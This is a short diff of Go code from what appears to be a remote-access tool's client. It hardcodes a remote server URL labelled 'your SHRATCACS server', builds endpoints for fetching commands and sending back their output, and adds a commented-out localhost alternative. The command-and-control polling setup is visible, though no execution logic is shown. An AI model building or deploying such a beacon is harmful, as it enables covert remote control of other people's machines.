@@ -228,6 +228,7 @@ func work() {
 	// URL endpoints for receiving commands and sending output
 	// url := readFile("url.txt")
 	url := "http://shratcacs.onrender.com" // your SHRATCACS server
+	// url := "http://localhost:3000"
 	commandURL := url + "/get-command"
 	outputURL := url + "/send-output"
 
